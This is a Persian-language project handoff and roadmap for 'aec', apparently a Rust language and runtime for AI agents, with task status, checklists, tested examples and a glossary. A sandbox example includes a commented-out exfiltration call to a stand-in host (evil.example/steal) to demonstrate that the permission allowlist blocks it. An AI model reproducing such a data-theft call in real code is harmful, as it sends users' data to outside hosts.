**گاتچای کشف‌شده:** برای `timeout: 10s` **اول باید باگ ۶ (بخش ۱۵) رفع می‌شد**؛
`duration_literal` در عمل کار نمی‌کرد.

---

### ۱۸.۵ گیت نوع در `aec run` — ✅ **انجام شد (جلسهٔ ۴)**

فقط ۳ خط در `cmd_run` (بعد از parse موفق، قبل از تشخیص UI):
```rust
if !run_type_check(&source, &program) { std::process::exit(1); }
```
تست: `crates/aec-cli/tests/run_type_gate.rs` — فایلی که قبل از خطا `print("RAN")` دارد
باید بدون چاپ `RAN` و با exit≠0 بمیرد.

### ۱۸.۷.۱ `var` — ✅ **انجام شد (جلسهٔ ۴)**
- گرامر `var_stmt` (هم‌شکل `let_stmt`)، `LetStmt.mutable: bool`.
- چکر: `Binding { ty, mutable }` به‌جای `HashMap<String, Ty>`؛ `DiagKind::AssignToImmutable`.
- ⚠️ مقدار **هم** type-check می‌شود تا کاربر هر دو خطا را با هم ببیند (تست قدیمی
  `assign_type_mismatch_is_error` هنوز سبز است).
- پارامتر تابع `mutable = true`، متغیر `for` تغییرناپذیر.
- runtime بدون تغییر (هر دو قابل assign هستند).

### ۱۸.۷.۲ Interpolation — ✅ **انجام شد (جلسهٔ ۴)**
- **بدون تغییر گرامر**: `build_literal` متن رشته را اسکن می‌کند و فقط `{...}`هایی که با
  `parse_expr` (تابع جدید عمومی در `aec-parser`) پارس شوند را interpolation می‌گیرد.
  پس `json.parse("{ \"a\": 1 }")` سالم می‌ماند.
- `InterpPart::Expr(String)` → `InterpPart::Expr(Expr)`؛ به همین دلیل **`Expr` و کل درختش
  `PartialEq` گرفتند** (وگرنه `Literal` هم نمی‌توانست — `literal.rs` قبلاً `PartialEq` داشت
  و تست‌های `literals.rs`/`smoke.rs` به آن تکیه دارند).
- runtime: `interp_text` اگر `Value::Object` کلید `text` داشت، همان را چاپ می‌کند (پروتکل مدل).
- UI: `eval_interpolated` + شاخه در `eval_value`/`eval_text_expr`/`expr_to_value`/`expr_to_string`
  (به همین دلیل `expr_to_string` حالا `state` هم می‌گیرد).

### ۱۸.۷.۳ `Result` + `?` — ✅ **انجام شد (جلسهٔ ۴)**
- `Value::Result(Ok|Err)` + builtinهای `ok`/`err`/`is_ok`/`is_err` (سینتکس را کاربر تأیید کرد).
- `?` = `Expr::Try`؛ چکر `Ty::Result(ok, err)` و `compatible` برای Result.
- **نحوهٔ unwinding:** `RuntimeError::EarlyReturn` (بخش ۸) — ساخته‌شده در `Expr::Try`،
  گرفته‌شده در `call_function`/`call_closure`. در `extract_host`-مانند هیچ گیتی ندارد.
- ⚠️ اگر این را بازنویسی کردی: خروجی `call_function` باید **`Value::Result(Err(payload))`**
  باشد نه payload خام (یک بار اشتباه شد و تست‌ها گرفتند).
- نکتهٔ جانبی: `stdlib.rs::value_to_json` برای `Result`/`Closure` شاخه گرفت (compile می‌شکند وگرنه).

### ۱۸.۷.۴ Closure / Lambda — ✅ **انجام شد (جلسهٔ ۴)**
- `x => e` / `x, y => e` / `=> e`؛ `Value::Closure(Rc<Closure>)`.
- صدا زدن: در `Expr::Call` اگر callee یک identifier باشد که در env به `Closure` بایند شده،
  از `call_closure` می‌رود؛ وگرنه مسیر نامی قبلی (builtin + `fn` سراسری).
- **capture by-move:** `Interpreter::capture_env` یک snapshot از متغیرهای محلی می‌سازد و
  `parent` را روی global می‌گذارد (تا فراخوانی `fn` سراسری و بازگشت کار کند).
- `fn`/`function` به‌عنوان **نوع تابع** (کلیدواژهٔ `function`، تأیید کاربر) تا lambda را
  بتوان به پارامتر/return type داد.
- ⚠️ **محدودیت مستندشده:** builtinهای stdlib نمی‌توانند closure صدا بزنند (به `Interpreter`
  دسترسی ندارند) → `map`/`filter`/`sort_by` با closure ممکن نیست. در بخش ۱۷ ثبت شد.

### ۱۸.۱۳ Quick Wins — ✅ **انجام شد (جلسهٔ ۴)** (به‌جز آیتم ۵)
1. لیست builtinهای چکر ✅ (باگ ۱۰) · 2. warning `padding` ✅ **واقعاً اعمال شد**
(با `ui.scope` و `spacing_mut().button_padding`، نه حذف) · 3. گیت نوع در `run` ✅ (۱۸.۵) ·
4. `DiagKind::NotIndexable` ❌ همچنان emit نمی‌شود · 5. `docs/roadmap.html` ❌ به‌روز نشد.

---

### ۱۸.۳ Cross-platform Build — وزن ۳٪

**هدف:** خروجی/ساخت روی ویندوز/مک/لینوکس.

**وضعیت:** فقط لینوکس تست شده. `eframe/egui` چندسکویی هست ولی CI و پکیج‌بندی نیست.

**فایل‌ها:** `.github/workflows/ci.yml` (جدید) — قبلش `git remote -v` بزن و ببین
مخزن روی GitHub است یا نه؛ اگر نه، یک اسکریپت `scripts/build-all.sh` جایگزین کن.

**گام‌ها:**
1. CI: `cargo check --workspace` + `cargo test --workspace` روی ubuntu/macos/windows.
2. روی لینوکس، `eframe` به `libxkbcommon`, `libgtk`, mesa نیاز دارد؛ در CI نصب کن.
3. (اختیاری) release artifact با `cargo build --release`.

**DoD:** فایل CI/اسکریپت نوشته شده و دست‌کم دستورها در README/هندآف ثبت شده.
> این آیتم بدون دسترسی به CI واقعی «تمام» نمی‌شود؛ اگر نشد، فقط اسکریپت را بنویس و ثبت کن.

---

### ۱۸.۴ State Sync کامل (UI ↔ Runtime) — وزن ۵٪

**وضعیت:** `sync_state_to_interpreter` / `sync_state_from_interpreter` هست ولی
`state_var_names` فقط از **اولین build** جمع می‌شود (`state.values.keys()`).
یعنی variableهایی که داخل کامپوننت/if/for ساخته می‌شوند یا بعداً اضافه می‌شوند همگام نمی‌شوند.

**فایل‌ها:** `crates/aec-ui/src/renderer.rs` (+ شاید `widgets.rs`).

**گام‌ها:**
1. تابعی بنویس که **همهٔ** نام‌های `@state` را از AST به‌صورت بازگشتی جمع کند
   (در `UiStatement::{State, Element(children), If(then/else), For(body), Component(render)}`).
2. در `AecApp::new` از آن استفاده کن (نه از `state.values.keys()`).
3. در `sync_state_from_interpreter`، اگر متغیری در interpreter نبود، مقدار state حفظ شود
   (الان فقط متغیرهای موجود به‌روز می‌شوند؛ رفتار نامعلوم برای جدیدها).
4. تست: یک تست واحد که `collect_state_names` را روی AST دستی چک کند.

**DoD:** تابع جمع‌آوری نام‌ها + تست؛ و rebuild بعد از event همان متغیرها را sync کند.

**گاتچا:** `UiStatement::Component` ممکن است به `ComponentDecl.render` نیاز داشته باشد؛
برای جمع‌آوری نام‌ها یا registry را هم بده، یا فعلاً فقط سطح UI را بپیمای.

---

### ۱۸.۵ گیت نوع در `aec run` — ✅ **انجام شد — توضیح کامل در ابتدای همین بخش (بالای ۱۸.۳)**

**هدف:** اجرا با خطای نوع متوقف شود. **فایل:** `crates/aec-cli/src/main.rs` → `cmd_run`.

**وضعیت قدیمی (باطل):** در جلسهٔ سوم این آیتم باز مانده بود. در جلسهٔ چهارم انجام شد.

---

### ۱۸.۶ Modules و چندفایلی + `pub` — (خارج از وزن جدول، اما لازم)

**وضعیت:** `import_stmt` پارس می‌شود؛ runtime هیچ کاری نمی‌کند.

**گام‌ها:**
1. یک "loader" در CLI بنویس: `load_program(path)` که فایل اصلی را پارس کند،
   `ImportStmt`ها را resolve کند (مسیر نسبی به فایل)، هر کدام را پارس کند، و `items` را ادغام کند.
2. تشخیص حلقه (visited set) + خطا برای فایل ناموجود.
3. `alias` فعلاً معنا ندارد؛ می‌توانی نادیده بگیری یا later.
4. `pub`: یا `pub` را به گرامر اضافه کن (بعد از `statement`/`fn_decl`/...)، یا فعلاً
   «همه چیز public» فرض کن و در گزارش ثبت کن.

**DoD:** یک پروژهٔ دو فایلی که فایل دوم تابعی دارد و فایل اول `import` می‌کند و صدا می‌زند، کار کند.

**گاتچا:** `Interpreter::run` باید همهٔ fnهای ادغام‌شده را register کند؛ اگر loader در CLI
انجام شود، AST نهایی به interpreter می‌رسد و مشکلی نیست.

---

### ۱۸.۷ سمنتیک زبان: `var` + interpolation + `Result`/`?` + closure — ✅ **همه انجام شد (جلسهٔ ۴)**

> جزئیات کامل چهار زیرآیتم در ابتدای همین بخش (بالای ۱۸.۳). این بخش فقط سابقهٔ طراحی است.
> **هیچ زیرآیتمی از ۱۸.۷ باز نیست.**

**۱۸.۷.۱ `var` (mutable) در برابر `let`**
- گرامر: `let_stmt` را به دو شکل بده یا یک قاعدهٔ `var_stmt` اضافه کن:
  `var_stmt = { "var" ~ identifier ~ (":" ~ base_type ~ "?")? ~ "=" ~ expr }`
- AST: `LetStmt` یک فیلد `mutable: bool` بگیرد (یا `Statement::Var(VarStmt)` جدید).
  ⚠️ تغییر در `LetStmt` همهٔ سازنده‌هایش را می‌شکند → `build_ast.rs` و تست‌ها را به‌روز کن.
- Runtime: تفاوتی ندارد (هر دو قابل assign هستند) — رفتار فعلی.
- Checker: `check_assign` روی متغیر immutable → خطا (`AssignToImmutable` به `DiagKind` اضافه کن).
- تست: `let x = 1; x = 2` → خطا؛ `var y = 1; y = 2` → اوکی.

**۱۸.۷.۲ Interpolation `"{expr}"`**
- `Literal::Interpolated(Vec<InterpPart>)` و `InterpPart::{Text, Expr}` **از قبل هستند**.
- گرامر `string_inner` فعلاً خام است؛ باید `{` و `}` را در رشته تشخیص دهد. راه ساده:
  در `build_literal` رشته را اسکن کن و اگر `{...}` داشت، `Literal::Interpolated` بساز
  (بدون تغییر گرامر — روی متن رشته کار کن).
- Runtime: هنگام ارزیابی `Literal::Interpolated`، هر `Expr` را... ⚠️ `InterpPart::Expr` فعلاً
  `String` است (نه `Expr`)! یعنی AST ارزیابی‌شدنی نیست. باید `InterpPart::Expr(Expr)` شود
  (تغییر نوع → همهٔ استفاده‌ها). بررسی کن و تغییر بده.
- پروتکل `Display`/auto-unpack: طبق چت، `ModelResponse` اگر فیلد `text: string` داشت
  در interpolation خودکار unpack می‌شود. ساده: هنگام interpolation، اگر مقدار
  `Value::Object` بود و کلید `text` داشت، همان را استفاده کن.

**۱۸.۷.۳ `Result<T,E>` + `?`**
- بزرگ‌ترین آیتم این گروه. نیاز به:
  - AST: نوع `Result(T, E)` در `TypeExpr`، و `Expr::Try(Box<Expr>)` برای `?`
  - گرامر: `"?"` به‌عنوان postfix اپراتور
  - Runtime: `Value::Result(Ok(Box<Value>) | Err(Box<Value>))` و انتشار خودکار خطا
  - Checker: نوع `Ty::Result(Box<Ty>, Box<Ty>)`
- پیشنهاد: اگر اعتبار اجازه نداد، این را به یک جلسهٔ جدا موکول کن و در گزارش ثبت کن.

**۱۸.۷.۴ Closure / Lambda**
- گرامر: قاعدهٔ `lambda_expr = { (identifier ~ ("," ~ identifier)*)? ~ "=>" ~ expr }`
  و افزودن به `primary_expr`.
- ⚠️ تداخل: `=>` نباید با `match_arm` که `->` دارد اشتباه شود (فرق دارند، مشکلی نیست).
- Runtime: `Value::Function` فعلاً `body: Block` دارد؛ برای lambda به یک نوع جدید نیاز داری
  (مثلاً `Value::Closure` با `params` + `Expr` + `Env`).
- تصمیم قفل‌شده: capture **by-move**.

---

### ۱۸.۸ Type Checker فاز ۲

- inference عمیق‌تر (بدون annotation)، انواع کاربر (struct)، generics سبک.
- type-check روی UI/theme (مثلاً `color` باید string باشد).
- `Ty::Object` دقیق‌تر (اکنون در compatible سخت‌گیر نیست).
- بهبود `DiagKind` جدید (مثل `AssignToImmutable`, `NotIndexable` واقعاً استفاده شود — الان تعریف شده ولی emit نمی‌شود جز جای خاص).

---

### ۱۸.۹ Testing Framework + CI — وزن ۳٪

- CI (هم‌پوشان با ۱۸.۳).
- پوشش: runtime (interpreter/stdlib/value) تست واحد ندارد → مهم‌ترین شکاف.
- پیشنهاد: `crates/aec-runtime/tests/interpreter.rs` با تست ارزیابی عبارات و فراخوانی توابع
  (بدون نیاز به UI).

---

### ۱۸.۱۰ Docs + Examples — وزن ۲٪ + ۲٪

- `docs/language.md` (مرجع سینتکس)، `docs/stdlib.md` (مرجع builtinها)، `docs/themes.md`، `docs/components.md`.
- `examples/`: علاوه بر `theme.aec`، نمونه‌های `chatbot.aec`، `components.aec`، `themes.aec`.
- ⚠️ نمونهٔ chatbot در جلسات قبل کار می‌کرد ولی **فایلش در repo نیست** — بازسازی‌اش ارزشمند است.
  برای chatbot به این‌ها نیاز داری: `@state` برای پیام‌ها، `Messages list: <array>`،
  `Input ... bind value to <state>`، `Button ... on click -> <fn>`، و `push_to` برای افزودن پیام.
  اگر UI به‌جای runtime، state را نشان می‌دهد، باید مطمئن شوی `push_to` روی همان آرایهٔ
  state کار می‌کند (تست کن).

---

### ۱۸.۱۱ Package Manager (AECPM) — وزن ۲٪

- manifest: `aec.toml` (نام، نسخه، dependencies)
- `aec add <pkg>` / `aec install`
- lockfile: `aec.lock`
- registry: حتی یک registry محلی/فایلی برای شروع کافی است.
- ⚠️ طبق سند: «فقط با نیاز اثبات‌شده» — پس آخر صف.

---

### ۱۸.۱۲ Optimization / A2A / IDE (پس از ۱۰۰٪)

- Optimization: bytecode VM، Caching برای LLM، sparse widget rebuild.
- A2A Protocol + امضای ED25519 + Consensus/PoI.
- IDE/LSP: با `render.rs` و `aec-check` پایه‌اش آماده است (تشخیص‌های دارای span).

---

### ۱۸.۱۳ آیتم‌های کوچک با ارزش بالا (Quick Wins)

> ✅ **جلسهٔ ۴:** آیتم‌های ۱، ۲ و ۳ انجام شدند (جزئیات بالای ۱۸.۳). آیتم ۴
> (`DiagKind::NotIndexable`) و آیتم ۵ (به‌روز کردن `docs/roadmap.html`) هنوز باز هستند.

1. **به‌روز کردن لیست builtinهای چکر** (بخش ۱۰) — تا هشدار «متغیر تعریف‌نشده» برای
   توابع واقعی built-in تولید نشود. مقدار زیادی خطای کاذب را حذف می‌کند.
2. **رفع warning `padding`** در `renderer.rs`.
3. **گیت نوع در `run`** (۱۸.۵).
4. **`DiagKind::NotIndexable`** را واقعاً emit کن (index روی نوع غیرآرایه).
5. **گزارش `docs/roadmap.html`** را بعد از هر آیتم به‌روز کن (اعداد بخش ۱۴).

---

## ۱۹) دستور پخت شروع جلسهٔ بعد (گام‌به‌گام)

```bash
# ۱) رفتن به مخزن
cd /home/mamadi/aec

# ۲) دیدن وضعیت
git status --porcelain
git log --oneline -3

# ۳) آیا چیزی شکسته؟ (انتظار: ۲۱۴ تست سبز، ۰ شکست)
#    ⚠️ --no-fail-fast بزن وگرنه بعد از اولین کریت شکست‌خورده بقیه اجرا نمی‌شود
cargo test --workspace --no-fail-fast 2>&1 | grep -E "^test result" | awk '{p+=$4; f+=$6} END {print "passed="p" failed="f}'
cargo test --workspace 2>&1 | tail -30

# ۴) اگر شکسته بود، کدام کریت؟
cargo check --workspace 2>&1 | grep -E "^error" -A5

# ۵) نمونهٔ سالم را چک کن
cargo run -q -p aec-cli -- check examples/theme.aec

# ۶) شروع آیتم هدف (پیش‌فرض: ۱۸.۵ = گیت نوع در run، بعد ۱۸.۱۳)
```

**قاعدهٔ کار در هر آیتم:**
1. اول AST/گرامر (اگر لازم است) → `cargo check -p aec-parser -p aec-ast`
2. سپس runtime/UI → `cargo check -p <crate>`
3. تست بنویس → `cargo test -p <crate>`
4. `cargo test --workspace`
5. `rustfmt` فقط روی فایل‌های جدید/دست‌خورده
6. `git status` بزن و مطمئن شو فایل نامرتبطی تغییر نکرده
7. گزارش `docs/roadmap.html` را به‌روز کن
8. **کامیت نکن**

---

## ۲۰) چک‌لیست «چیزی را نشکستم؟»

قبل از اعلام پایان هر آیتم، همهٔ این‌ها باید سبز باشند:

- [ ] `cargo check --workspace` بدون خطا و **بدون warning**
- [ ] `cargo test --workspace --no-fail-fast` → **۲۱۴+ تست سبز**، هیچ FAILED
- [ ] `aec check examples/theme.aec` → `Type check passed`
- [ ] `aec check` روی یک فایل با خطای عمدی → خطا + snippet + exit code 1
- [ ] `aec ast examples/theme.aec` بدون panic
- [ ] `git status --porcelain` → فقط فایل‌های مرتبط
- [ ] هیچ کامیتی زده نشده
- [ ] فایل‌های `.backup` ساخته/restore نشده‌اند
- [ ] پارس این‌ها هنوز کار می‌کند: کامپوننت چندخطی، تم با `extends`، `Column background: theme.x { }`،
      `if a and b or c { }`، `Text "x" size: 20`
- [ ] **آیا فایل `*.sqlite` جدیدی در `git status` ظاهر شده؟** (باید ignore شده باشد)
- [ ] **آیا پیام تازه‌ای فارسی نوشتی؟** (نباید — همهٔ تشخیص‌ها و کامنت‌ها انگلیسی؛
      فقط محتوای برنامه/دادهٔ تست می‌تواند فارسی باشد)
- [ ] `aec run` روی فایلی با خطای نوع → **خطا + exit 1** (۱۸.۵ انجام شده؛ تست:
      `crates/aec-cli/tests/run_type_gate.rs`)
- [ ] این‌ها هنوز کار می‌کنند: `permissions { network: [...] }` روی دامنهٔ غیرمجاز →
      خطای `permission denied`؛ `limits { timeout: 10s }` پارس می‌شود؛ `let x = 10s`
      یک statement است (نه دو تا)
- [ ] 🆕 **زبان جلسهٔ ۴:** `var x = 1; x = 2` اجرا می‌شود و `let x = 1; x = 2` خطای
      `AssignToImmutable` می‌دهد · `let x = none` پارس می‌شود · `"{1 + 1}"` می‌شود `"2"` ·
      `let x: int? = none` نوعش `Optional(int)` است · `fn f() -> Result(int, string) { return ok(1) }`
      بدون خطا · `let f = x => x + 1` و `f(1)` کار می‌کند · `let f = 5?` در runtime خطا می‌دهد
- [ ] 🆕 **اگر literal/کلیدواژه‌ای به گرامر اضافه کردی، قاعده‌اش نامدار است** (گاتچا ۱۱)

> ⚠️ **دام دستوری:** `cmd1 && echo ok` وقتی `cmd1` شمارش صفر برگرداند (مثل `grep -c`)
> با exit 1 زنجیره را می‌شکند و دستورهای بعدی **بی‌صدا اجرا نمی‌شوند**. برای چک‌لیست
> از خط جدا یا `;` استفاده کن، نه `&&`.

---

## ۲۱) نمونه‌های `.aec` آزموده‌شده

> 🆕 **جلسهٔ ۴ — سه مثال جدید در `examples/` که با `aec check` و `aec run` واقعاً اجرا شدند:**
> `examples/lambda.aec` (closure + `function`)، `examples/result.aec` (`Result`/`?`)،
> `examples/language.aec` (`var` + interpolation + حلقه‌ها). خروجی واقعی:
> ```
> $ aec run examples/lambda.aec --cli --entry main
> add5(10) = 15
> mul(6, 7) = 42
> apply(x => x * 3, 4) = 12
> captured by move: add_base(1) = 2
>
> $ aec run examples/result.aec --cli --entry main
> good: ok(listening on port 8080)
> bad is_err: true
> bad: err(port must be positive, got -1)
>
> $ aec run examples/language.aec --cli --entry main
> sum_to(5) = 15
> cart has 3 item(s)
> report = [a][b][c]
> ```

### `examples/sandbox.aec` (در repo هست — مجوزها، مسیر مجاز)

```aec
# Sandbox / Permissions
#
# Run:
#   aec run examples/sandbox.aec --cli --entry main
#
# This example shows the ALLOWED path. To see a DENIAL, uncomment the marked
# line below -- you get a clear `permission denied` message and exit code 1.
#
# Note: no `permissions` block means "no restrictions" (backward compatible).
# Having one means "closed by default": every undeclared key is denied.

agent SandboxDemo

permissions {
    network: ["api.example.com"]

    filesystem {
        read:  ["."]
        write: ["."]
    }

    system {
        metrics: true
        restart: false
    }
}

limits {
    concurrency: 4
    timeout: 5s
}

fn main() -> int {
    let path = "sandbox-demo.txt"

    # ALLOWED -- writing and reading inside the declared root
    file.write(path, "hello from inside the sandbox")
    let back = file.read(path)
    print("written and read back:", back)

    # ALLOWED -- because `system { metrics: true }` is declared
    let info = sys.info()
    print("sys.info allowed:", info)

    # DENIED -- this host is not in the allowlist:
    #   permission denied: network denied: host "evil.example" is not in the allowlist ...
    # let stolen = http.get("https://evil.example/steal")

    file.delete(path)
    print("temporary file removed.")
    return 0
}
```

> ⚠️ `fn main()` **بدون** `-> int` خطای نوع می‌دهد (پیش‌فرض `unit` است).
> برای دیدن مسیر **رد شدن**، این خط را از کامنت دربیاور:
> `let stolen = http.get("https://evil.example/steal")`
> → `permission denied: network denied: host "evil.example" is not in the allowlist ...` + exit 1

### `examples/memory.aec` (در repo هست — حافظهٔ پیوسته)

```aec
# Persistent Memory (SQLite)
#
# Shows that conversation memory survives across runs.
#
# Run:
#   aec run examples/memory.aec --cli --entry main
#
# Run it twice: the message count grows and the previous history is printed too.
# The database file is created next to the working directory.

agent MemoryDemo

fn main() -> int {
    let db = "aec-memory-demo.sqlite"
    let conv = "demo"

    # Connect to persistent memory (the file is created if missing)
    memory.open(db)

    let before = memory.count(conv)
    print("messages before:", before)

    # Append one exchange
    memory.add(conv, "user", "Hello, my name is Reza")
    memory.add(conv, "assistant", "Hi Reza! How can I help?")

    print("count after appending:", memory.count(conv))

    # Read the full history, including messages from earlier runs
    print("history:", memory.get(conv))

    return 0
}
```

> ⚠️ `fn main()` **بدون** `-> int` خطای نوع می‌دهد (چون پیش‌فرض `unit` است).
> اجرا: `aec run examples/memory.aec --cli --entry main`

### `examples/theme.aec` (در repo هست — رفرنس تم + کامپوننت)

```aec
# examples/theme.aec
# Theme System — declaring a global theme and using its tokens in elements and components

agent ThemeDemo

theme Dark default {
    color {
        background: "#1e1e2e"
        surface: "#313244"
        text: "#cdd6f4"
        muted: "#a6adc8"
        primary: "#89b4fa"
    }
    text {
        size: 16
        weight: "normal"
    }
    spacing {
        sm: 4
        md: 8
        lg: 16
    }
    shape {
        radius: 8
    }
}

# A second theme that extends Dark and only overrides its colors
theme Ocean extends Dark {
    color {
        background: "#0b132b"
        surface: "#1c2541"
        primary: "#00b4d8"
    }
}

component MessageBubble {
    prop role: string
    prop content: string

    render {
        Card {
            Text role { color: theme.color.primary weight: "bold" }
            Text content
        }
    }
}

ui Main = Screen "Theme Demo" {
    @draft: string = ""

    Column background: theme.color.background {
        Text "🎨 Theme System" size: 24 weight: "bold"
        Text "توکن‌های تم سراسری، قابل استفاده در همهٔ عناصر" color: theme.color.muted

        Card {
            MessageBubble role: "user" content: "سلام!"
            MessageBubble role: "ai" content: "سلام! چطور میتونم کمک کنم؟"
        }

        Row {
            Input placeholder: "پیام..." bind value to draft
            Button "بفرست" background: theme.color.primary
        }
    }
}
```

### نمونهٔ کامپوننت مینیمال (تست‌شده)

```aec
agent Test

component Empty {
    render {
    }
}

component MessageBubble {
    prop role: string
    prop content: string

    render {
        Column {
            Text role { color: "#667eea" weight: "bold" }
            Text content
        }
    }
}

ui Main = Screen "Chat" {
    Column {
        MessageBubble role: "user" content: "سلام"
        MessageBubble role: "ai" content: "سلام!"
    }
}
```

### نمونهٔ سالم برای چکر نوع (تست‌شده)

```aec
agent Test

fn add(a: int, b: int) -> int {
    return a + b
}

fn main() -> int {
    let total = add(1, 2)
    if total > 0 and total < 10 {
        return total
    }
    return 0
}
```

### نمونهٔ پرخطا برای چکر (تست‌شده — باید ۳ خطا + ۱ هشدار بدهد)

```aec
agent Test

model primary {
    provider: "openai"
    name: "gpt-4o"
}

fn add(a: int, b: int) -> int {
    return a + b
}

fn bad() -> int {
    let x: int = "hello"     // error: TypeMismatch
    let y = add(1)           // error: ArityMismatch
    x = "no"                 // error: TypeMismatch
    return zzz               // warning: UndeclaredVariable
}
```

---

## ۲۲) واژه‌نامهٔ اصطلاحات پروژه

| اصطلاح | معنی |
|---|---|
| کارت (`Card`) | ویجت ظرف با frame گروهی egui |
| token | یک ورودی در گروه تم، مثل `color.primary` |
| تم فعال (`active theme`) | تمی که ارجاع‌های `theme.x.y` در برابر آن حل می‌شوند |
| `Container` | ویجت بدون style؛ خروجی expand کامپوننت ناشناخته/بدون style |
| تشخیص (`Diagnostic`) | خطا یا هشدار چکر با span |
| ملایم (`lenient`) | سیاست چکر: شک → `Any` |
| گیت (`gate`) | خطا که اجرا/موفقیت را متوقف می‌کند (هشدار گیت نیست) |
| `identifier_primary` | قاعده‌ای که identifier را فقط وقتی آرگومان اصلی می‌کند که `:` نداشته باشد |
| `BuildCtx` | زمینهٔ ساخت widget (کامپوننت‌ها + تم فعال + گارد recursion) |
| مجوز (`permissions`) | بلاکی که allowlist شبکه/فایل/سیستم را اعلام می‌کند؛ نبودش = بدون گیت |
| پیش‌فرض بسته | اگر بلاک `permissions` باشد و کلیدی اعلام نشود، آن دسته **مجاز نیست** |
| `FsMode` | جهت دسترسی فایل: `Read` یا `Write` |
| `Limits` | سقف‌های اجرا (`concurrency`, `timeout`) از بلاک `limits` |
| `with_span` | متد `RuntimeError` که `Span::dummy()` را با موقعیت واقعی فراخوانی جایگزین می‌کند |
| `PermissionDenied` | variant خطای runtime برای نقض مجوز |
| `AssignToImmutable` | تشخیص چکر برای assign به یک بایند `let` (جلسهٔ ۴) |
| `ok(v)` / `err(e)` | سازنده‌های `Result` (جلسهٔ ۴) |
| `?` (try) | روی `ok(v)` مقدار را باز می‌کند؛ روی `err(e)` خطا را از تابع فعلی برمی‌گرداند (جلسهٔ ۴) |
| `EarlyReturn` | سیگنال داخلی `RuntimeError` برای `?`؛ فقط در مرز تابع گرفته می‌شود (جلسهٔ ۴) |
| lambda / closure | تابع بی‌نام `x => expr`؛ capture **by-move** (جلسهٔ ۴) |
| `function` | کلیدواژهٔ نوع برای «هر مقدار تابعی» (جلسهٔ ۴) |
| interpolation | `"{expr}"` در رشته؛ فقط اگر متن داخلش expression معتبر باشد (جلسهٔ ۴) |
| `InterpPart` | یک قطعه از رشتهٔ interpolation: `Text` یا `Expr(Expr)` (جلسهٔ ۴) |
| `capture_env` | snapshot متغیرهای محلی برای lambda؛ globalها از parent link (جلسهٔ ۴) |

---

## ۲۳) اگر اعتبار تمام شد — همین‌جا ادامه بده

- **وضعیت امن است:** همه‌چیز در working tree است، کامیتی لازم نیست.
- اگر وسط یک آیتم بودی، در گزارش/چت بنویس: «آیتم X، فایل‌های A و B نیمه‌کاره».
- جلسهٔ بعد: `cargo test --workspace` (اگر نشکسته، سبز) → بخش ۱۹ → ادامه از همان آیتم.
- اگر کریتی نیمه‌کاره اضافه شده، `cargo check --workspace` نشانش می‌دهد.

